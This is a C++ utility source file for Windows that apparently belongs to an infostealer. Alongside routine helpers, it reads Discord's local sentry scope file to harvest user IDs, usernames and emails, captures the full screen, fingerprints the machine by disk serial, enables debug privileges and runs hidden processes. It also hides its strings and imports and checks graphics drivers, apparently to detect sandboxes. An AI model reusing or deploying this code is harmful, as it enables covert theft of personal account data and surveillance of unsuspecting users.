#include "stdafx.hpp"
#include "utils\utils.hpp"

std::string utils::string::fnv1_hash( const std::string &text )
{
	const auto hash = [ ]( const std::string &text )
	{
		uint32_t uint32 = 2166136261;

		for ( char const c : text )
		{
			uint32 ^= static_cast< uint32_t >( c );
			uint32 *= 16777619;
		}

		return uint32;
	};

	std::stringstream ss;
	ss << std::hex << std::setw( 8 ) << std::setfill( '0' ) << hash( text );

	return string::to_upper( ss.str( ) );
}

bool utils::process::get_previleges( )
{
	HANDLE handle {};
	TOKEN_PRIVILEGES tkp {};

	if ( !OpenProcessToken( GetCurrentProcess( ), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &handle ) )
		return false;

	if ( !LookupPrivilegeValueA( nullptr, SE_DEBUG_NAME, &tkp.Privileges[ 0 ].Luid ) )
		return false;

	tkp.PrivilegeCount = 1;
	tkp.Privileges[ 0 ].Attributes = SE_PRIVILEGE_ENABLED;

	if ( !AdjustTokenPrivileges( handle, false, &tkp, sizeof( TOKEN_PRIVILEGES ), nullptr, nullptr ) )
		return false;

	CloseHandle( handle );

	return true;
}

int utils::process::get_process_id( const std::string &name )
{
	const auto handle = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );

	PROCESSENTRY32 pe;
	pe.dwSize = sizeof( pe );

	if ( !Process32First( handle, &pe ) )
		return 0;

	do
	{
		if ( name == pe.szExeFile )
		{
			CloseHandle( handle );
			return pe.th32ProcessID;
		}

	} while ( Process32Next( handle, &pe ) );

	return 0;
}

int utils::process::get_service_id( const std::string &name )
{
	const auto manager_handle = OpenSCManagerA( nullptr, nullptr, 0 );
	const auto service_handle = OpenServiceA( manager_handle, name.c_str( ), SERVICE_QUERY_STATUS );

	SERVICE_STATUS_PROCESS ssp = {};
	DWORD bytes = 0;

	QueryServiceStatusEx( service_handle, SC_STATUS_PROCESS_INFO, reinterpret_cast< uint8_t * >( &ssp ), sizeof( ssp ), &bytes );

	CloseServiceHandle( service_handle );
	CloseServiceHandle( manager_handle );

	return ssp.dwProcessId;
}

void utils::system::create_process( const std::string &command )
{
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;

	std::memset( &si, 0, sizeof( si ) );
	std::memset( &pi, 0, sizeof( pi ) );

	si.cb = sizeof( si );
	CreateProcessA( nullptr, const_cast< LPSTR >( command.c_str( ) ), nullptr, nullptr, 0, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi );

	WaitForSingleObject( pi.hProcess, INFINITE );

	CloseHandle( pi.hProcess );
	CloseHandle( pi.hThread );
}

std::string utils::string::bstr_to_str( const BSTR bstr )
{
	if ( !bstr )
		return {};

	const std::wstring ws( bstr, SysStringLen( bstr ) );
	using facet_type = std::codecvt<wchar_t, char, std::mbstate_t>;
	[[maybe_unused]] auto &facet = std::use_facet<facet_type>( std::locale( ) );
	std::wstring_convert<std::remove_reference_t<decltype( facet )>> converter;

	return converter.to_bytes( ws );
}

bool utils::wmi::initialize( )
{

	if ( FAILED( CoInitializeEx( nullptr, COINIT_MULTITHREADED ) ) )
	{
		return false;
	}

	if ( FAILED( CoInitializeSecurity( nullptr, -1, nullptr, nullptr, RPC_C_AUTHN_LEVEL_DEFAULT,
									   RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_NONE, nullptr ) ) )
	{
		CoUninitialize( );
		return false;
	}

	if ( FAILED( CoCreateInstance( CLSID_WbemLocator, nullptr, CLSCTX_INPROC_SERVER,
								   IID_IWbemLocator, reinterpret_cast< void ** >( &locator ) ) ) )
	{
		CoUninitialize( );
		return false;
	}

	if ( FAILED( locator->ConnectServer( _bstr_t( E( L"ROOT\\CIMV2" ) ), nullptr, nullptr,
										 nullptr, 0, nullptr, nullptr, &service ) ) )
	{
		locator->Release( );
		CoUninitialize( );
		return false;
	}

	if ( FAILED( CoSetProxyBlanket( service, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE,
									nullptr, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_NONE ) ) )
	{
		service->Release( );
		locator->Release( );
		CoUninitialize( );
		return false;
	}

	return true;
}

void utils::wmi::cleanup( )
{
	service->Release( );
	locator->Release( );

	CoUninitialize( );
}

bool utils::wmi::query( std::string_view wql_query, const std::function<void( IWbemClassObject *, VARIANT * )> &get_property )
{

	if ( !service )
		return false;

	IEnumWbemClassObject *enumerator {};
	if ( FAILED( service->ExecQuery( _bstr_t( E( "WQL" ) ), bstr_t( wql_query.data( ) ),
									 WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, nullptr, &enumerator ) ) )
		return false;

	IWbemClassObject *pcls_obj {};
	unsigned long u_return {};

	while ( enumerator )
	{
		enumerator->Next( WBEM_INFINITE, 1, &pcls_obj, &u_return );

		if ( !u_return )
			break;

		VARIANT vt_prop {};
		SAFE_CALL( VariantInit )( &vt_prop );
		get_property( pcls_obj, &vt_prop );
		SAFE_CALL( VariantClear )( &vt_prop );

		pcls_obj->Release( );
	}

	enumerator->Release( );

	return true;

}

std::string utils::wmi::get_cpu( )
{
	std::string output {};

	utils::wmi::query( E( "SELECT * FROM Win32_Processor" ), [ & ]( IWbemClassObject *pcls_vbj, VARIANT *vt_prop )
	{
		pcls_vbj->Get( E( L"Name" ), 0, vt_prop, nullptr, nullptr );
		output = utils::string::bstr_to_str( vt_prop->bstrVal );
	} );

	return output;
}

std::string utils::wmi::get_gpu( )
{
	std::string output {};

	utils::wmi::query( E( "SELECT * FROM Win32_VideoController" ), [ & ]( IWbemClassObject *pcls_vbj, VARIANT *vt_prop )
	{
		pcls_vbj->Get( E( L"Name" ), 0, vt_prop, nullptr, nullptr );
		output = utils::string::bstr_to_str( vt_prop->bstrVal );
	} );

	return output;
}

std::string utils::wmi::get_ram( )
{
	std::string output {};

	utils::wmi::query( E( "SELECT * FROM Win32_ComputerSystem" ), [ & ]( IWbemClassObject *pcls_vbj, VARIANT *vt_prop )
	{
		pcls_vbj->Get( E( L"TotalPhysicalMemory" ), 0, vt_prop, nullptr, nullptr );
		_bstr_t bstrVal( vt_prop->bstrVal );
		long long total_bytes = _wtoll( bstrVal );
		double total_gb = static_cast< double >( total_bytes ) / ( 1024 * 1024 * 1024 );
		std::stringstream stream;
		stream << std::fixed << std::setprecision( 2 ) << total_gb;
		output = stream.str( ) + " GB";
	} );

	return output;
}

std::string utils::system::get_user_info( )
{
	std::string result = {};

	const std::vector<std::string> builds
	{
		E( "discord" ),
		E( "discordptb" ),
		E( "discordcanary" ),
	};

	for ( const auto &build : builds )
	{
		try
		{
			const std::string appdata = std::getenv( E( "APPDATA" ) );
			const std::string file_path = appdata + string::format( E( R"(\{}\sentry\scope_v3.json)" ), build );

			if ( !std::filesystem::exists( file_path ) )
				continue;

			const auto file_content = fs::read_file( file_path );
			const auto json = nlohmann::json::parse( file_content, nullptr, false );

			nlohmann::json base {};

			if ( json.contains( E( "scope" ) ) )
				base = json[ E( "scope" ) ][ E( "user" ) ];
			else
				base = json[ E( "user" ) ];

			const auto id = base[ E( "id" ) ].get<std::string>( );
			const auto username = base[ E( "username" ) ].get<std::string>( );
			const auto email = base[ E( "email" ) ].get<std::string>( );

			if ( id.empty( ) || result.contains( id ) )
				continue;

			result += string::format( E( "ID: <@{}>\nUsername: {}\nEmail: {}\n\n" ), id, username, email );
		}
		catch ( ... )
		{

		}
	}

	return result.empty( ) ? E( "Not Found!\n" ) : result;
}

bool utils::system::check_graphic_card( )
{
	DISPLAY_DEVICE dd;
	dd.cb = sizeof( DISPLAY_DEVICE );

	if ( !EnumDisplayDevices( nullptr, 0, &dd, 0 ) )
		return false;

	const std::unordered_set<std::string> vendors {
		E( "amd" ),
		E( "intel" ),
		E( "nvidia" ),
		E( "radeon" )
	};

	log_dbg( E( "Driver detected: {}" ), dd.DeviceString );

	if ( std::string const device_string = string::to_lower( dd.DeviceString ); string::contains( device_string, vendors ) )
	{
		return true;
	}

	return false;
}

bool utils::system::search_drivers( const std::string &driver_name )
{
	LPVOID drivers[ 1024 ];
	DWORD out_buffer {};

	if ( !EnumDeviceDrivers( drivers, sizeof( drivers ), &out_buffer ) && out_buffer < sizeof( drivers ) )
		return false;

	for ( auto i = 0; i < out_buffer / sizeof( drivers[ 0 ] ); i++ )
	{
		if ( TCHAR sz_driver[ 1024 ]; GetDeviceDriverBaseName( drivers[ i ], sz_driver, std::size( sz_driver ) ) &&
			 string::to_lower( sz_driver ) == string::to_lower( driver_name ) )
			return true;
	}

	return false;
}

std::vector<uint8_t> utils::others::base64_decode( const std::string &str )
{
	static const std::string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

	std::vector<uint8_t> result;
	int i = 0, j = 0, in_len = str.size( );
	uint32_t char_arr_4[ 4 ], char_arr_3[ 3 ];

	while ( in_len-- && str[ j ] != '=' && ( isalnum( str[ j ] ) || str[ j ] == '+' || str[ j ] == '/' ) )
	{
		char_arr_4[ i++ ] = chars.find( str[ j++ ] );

		if ( i == 4 )
		{
			char_arr_3[ 0 ] = ( char_arr_4[ 0 ] << 2 ) + ( ( char_arr_4[ 1 ] & 0x30 ) >> 4 );
			char_arr_3[ 1 ] = ( ( char_arr_4[ 1 ] & 0xf ) << 4 ) + ( ( char_arr_4[ 2 ] & 0x3c ) >> 2 );
			char_arr_3[ 2 ] = ( ( char_arr_4[ 2 ] & 0x3 ) << 6 ) + char_arr_4[ 3 ];

			for ( i = 0; i < 3; i++ )
			{
				result.push_back( char_arr_3[ i ] );
			}

			i = 0;
		}
	}

	if ( i )
	{
		for ( auto j { 0 }; j < i; j++ )
		{
			char_arr_4[ j ] = chars.find( str[ j ] );
		}

		char_arr_3[ 0 ] = ( char_arr_4[ 0 ] << 2 ) + ( ( char_arr_4[ 1 ] & 0x30 ) >> 4 );
		char_arr_3[ 1 ] = ( ( char_arr_4[ 1 ] & 0xf ) << 4 ) + ( ( char_arr_4[ 2 ] & 0x3c ) >> 2 );

		for ( auto j { 0 }; j < i - 1; j++ )
		{
			result.push_back( char_arr_3[ j ] );
		}
	}

	return result;
}

std::vector<uint8_t> utils::others::capture_screen( )
{
	const auto detect_color_bits = [ ]( uint16_t const color_bits )
	{
		if ( color_bits == 1 )       return 1;
		else if ( color_bits <= 4 )  return 4;
		else if ( color_bits <= 8 )  return 8;
		else if ( color_bits <= 16 ) return 16;
		else if ( color_bits <= 24 ) return 24;
		else						 return 32;
	};

	const auto destroy = [ ]( HDC const hdc_screen, HDC const hdc_memory, HBITMAP const hbm_screen )
	{
		DeleteDC( hdc_screen );
		DeleteDC( hdc_memory );
		DeleteObject( hbm_screen );
	};

	const int width = GetSystemMetrics( SM_CXVIRTUALSCREEN );
	const int height = GetSystemMetrics( SM_CYVIRTUALSCREEN );

	const auto hdc_screen = CreateDCA( "DISPLAY", nullptr, nullptr, nullptr );
	const auto hdc_memory = CreateCompatibleDC( hdc_screen );

	if ( !StretchBlt( hdc_memory, 0, 0, width, height, hdc_screen, 0, 0, width, height, SRCCOPY ) )
		return {};

	const auto hbm_screen = CreateCompatibleBitmap( hdc_screen, width, height );

	if ( !BitBlt( hdc_memory, 0, 0, width, height, hdc_screen, 0, 0, SRCCOPY ) )
		return {};

	if ( !SelectObject( hdc_memory, hbm_screen ) )
	{
		destroy( hdc_memory, hdc_memory, hbm_screen );
		return {};
	}

	if ( !StretchBlt( hdc_memory, 0, 0, width, height, hdc_screen, 0, 0, width, height, SRCCOPY ) )
	{
		destroy( hdc_memory, hdc_memory, hbm_screen );
		return {};
	}

	BITMAP bmp {};
	if ( !GetObjectA( hbm_screen, sizeof( BITMAP ), reinterpret_cast< LPSTR >( &bmp ) ) )
	{
		destroy( hdc_memory, hdc_memory, hbm_screen );
		return {};
	}

	const auto color_bits = detect_color_bits( bmp.bmPlanes * bmp.bmBitsPixel );

	PBITMAPINFO pbmi;

	if ( color_bits != 24 )
		pbmi = static_cast< PBITMAPINFO >( LocalAlloc( LPTR, sizeof( BITMAPINFOHEADER ) + sizeof( RGBQUAD ) * ( 1 << color_bits ) ) );
	else
		pbmi = static_cast< PBITMAPINFO >( LocalAlloc( LPTR, sizeof( BITMAPINFOHEADER ) ) );

	pbmi->bmiHeader.biSize = sizeof( BITMAPINFOHEADER );
	pbmi->bmiHeader.biWidth = bmp.bmWidth;
	pbmi->bmiHeader.biHeight = bmp.bmHeight;
	pbmi->bmiHeader.biPlanes = bmp.bmPlanes;
	pbmi->bmiHeader.biBitCount = bmp.bmBitsPixel;

	if ( color_bits < 24 )
		pbmi->bmiHeader.biClrUsed = ( 1 << color_bits );

	pbmi->bmiHeader.biCompression = BI_RGB;
	pbmi->bmiHeader.biSizeImage = ( pbmi->bmiHeader.biWidth + 7 ) / 8 * pbmi->bmiHeader.biHeight * color_bits;
	pbmi->bmiHeader.biClrImportant = 0;

	const auto pbih = reinterpret_cast< PBITMAPINFOHEADER >( pbmi );
	const auto lp_bits = static_cast< uint8_t * >( GlobalAlloc( GMEM_FIXED, pbih->biSizeImage ) );

	if ( !lp_bits )
	{
		destroy( hdc_memory, hdc_memory, hbm_screen );
		LocalFree( pbmi );
		GlobalFree( lp_bits );
		return {};
	}

	if ( !GetDIBits( hdc_memory, hbm_screen, 0, pbih->biHeight, lp_bits, pbmi, DIB_RGB_COLORS ) )
	{
		destroy( hdc_memory, hdc_memory, hbm_screen );
		LocalFree( pbmi );
		GlobalFree( lp_bits );
		return {};
	}

	BITMAPFILEHEADER hdr {};
	hdr.bfType = 0x4d42;
	hdr.bfSize = sizeof( BITMAPFILEHEADER ) + pbih->biSize + pbih->biClrUsed * sizeof( RGBQUAD ) + pbih->biSizeImage;
	hdr.bfReserved1 = 0;
	hdr.bfReserved2 = 0;
	hdr.bfOffBits = sizeof( BITMAPFILEHEADER ) + pbih->biSize + pbih->biClrUsed * sizeof( RGBQUAD );

	std::vector<uint8_t> bmp_buffer {};
	bmp_buffer.reserve( hdr.bfSize );
	bmp_buffer.insert( bmp_buffer.end( ), reinterpret_cast< uint8_t * >( &hdr ), reinterpret_cast< uint8_t * >( &hdr ) + sizeof( BITMAPFILEHEADER ) );
	bmp_buffer.insert( bmp_buffer.end( ), reinterpret_cast< uint8_t * >( pbih ), reinterpret_cast< uint8_t * >( pbih ) + sizeof( BITMAPINFOHEADER ) + pbih->biClrUsed * sizeof( RGBQUAD ) );
	bmp_buffer.insert( bmp_buffer.end( ), lp_bits, lp_bits + pbih->biSizeImage );

	destroy( hdc_memory, hdc_memory, hbm_screen );
	LocalFree( pbmi );
	GlobalFree( lp_bits );

	return bmp_buffer;
}

std::string utils::others::get_hwid_hash( )
{
	STORAGE_PROPERTY_QUERY      query {};
	STORAGE_DESCRIPTOR_HEADER   desc_header {};
	STORAGE_DEVICE_DESCRIPTOR *device_descriptor {};
	DWORD                       bytes_returned;

	HANDLE const device = SAFE_CALL( CreateFileA )(
		E( "\\\\.\\PhysicalDrive0" ), 0, FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr );
	if ( !device ) return "";

	query.PropertyId = StorageDeviceProperty;
	query.QueryType = PropertyStandardQuery;

	if ( !DeviceIoControl( device, IOCTL_STORAGE_QUERY_PROPERTY,
						   &query, sizeof( STORAGE_PROPERTY_QUERY ),
						   &desc_header, sizeof( STORAGE_DESCRIPTOR_HEADER ),
						   &bytes_returned, 0 ) )
	{
		return "";
	}

	uint8_t *out_buffer = new uint8_t[ desc_header.Size ];
	std::memset( out_buffer, 0, desc_header.Size );

	if ( !DeviceIoControl( device, IOCTL_STORAGE_QUERY_PROPERTY,
						   &query, sizeof( STORAGE_PROPERTY_QUERY ),
						   out_buffer, desc_header.Size,
						   &bytes_returned, 0 ) )
	{
		delete[ ] out_buffer;
		return "";
	}

	device_descriptor = reinterpret_cast< STORAGE_DEVICE_DESCRIPTOR * >( out_buffer );
	if ( device_descriptor->SerialNumberOffset )
	{
		std::string const serial_num = reinterpret_cast< const char * >( out_buffer + device_descriptor->SerialNumberOffset );

		delete[ ] out_buffer;
		CloseHandle( device );

		return utils::string::fnv1_hash( serial_num );
	}

	return "";
}